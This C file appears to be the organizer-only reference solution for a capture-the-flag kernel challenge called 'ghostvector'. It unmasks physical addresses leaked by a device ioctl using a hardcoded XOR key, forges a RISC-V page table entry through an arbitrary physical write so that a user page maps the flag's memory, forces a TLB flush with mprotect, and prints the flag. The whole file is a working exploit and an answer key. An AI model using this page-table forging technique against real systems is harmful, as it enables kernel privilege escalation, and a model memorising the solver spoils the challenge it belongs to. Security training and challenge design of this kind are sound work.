/* Organizer-only reference solver. Do not include this directory in the task. */
#define _GNU_SOURCE
#include <fcntl.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <unistd.h>

#include "ghostvector.h"

#define LAYOUT_XOR 0x9d37c4b1a62ef059ULL
#define PTE_V 0x001ULL
#define PTE_R 0x002ULL
#define PTE_U 0x010ULL
#define PTE_A 0x040ULL
#define PTE_D 0x080ULL

int main(void)
{
    struct gv_layout layout = { .user_address = (uint64_t)(uintptr_t)GV_MAP_ADDRESS };
    uint64_t pte;
    uint64_t pte_pa;
    uint64_t flag_pa;
    int fd;
    size_t byte;
    volatile char *flag;

    if (mmap(GV_MAP_ADDRESS, GV_PAGE_SIZE, PROT_READ | PROT_WRITE,
             MAP_PRIVATE | MAP_ANONYMOUS | MAP_FIXED_NOREPLACE, -1, 0) == MAP_FAILED) {
        perror("mmap");
        return 1;
    }
    *(volatile char *)GV_MAP_ADDRESS = 0;
    fd = open(GV_DEVICE, O_RDONLY);
    if (fd < 0 || ioctl(fd, GV_GET_LAYOUT, &layout) != 0) {
        perror("GV_GET_LAYOUT");
        return 1;
    }
    close(fd);

    pte_pa = layout.masked_pte_pa ^ LAYOUT_XOR;
    flag_pa = layout.masked_flag_pa ^ LAYOUT_XOR;
    pte = ((flag_pa >> 12) << 10) | PTE_V | PTE_R | PTE_U | PTE_A | PTE_D;
    for (byte = 0; byte < sizeof(pte); ++byte)
        gv_store8(pte_pa + byte, (uint8_t)(pte >> (byte * 8)));

    /* U-mode cannot execute sfence.vma; mprotect makes the kernel flush it. */
    if (mprotect(GV_MAP_ADDRESS, GV_PAGE_SIZE, PROT_READ) != 0) {
        perror("mprotect");
        return 1;
    }
    flag = GV_MAP_ADDRESS;
    if (flag[0] != 'c') {
        fputs("mapping did not change\n", stderr);
        return 2;
    }
    puts((const char *)flag);
    return 0;
}
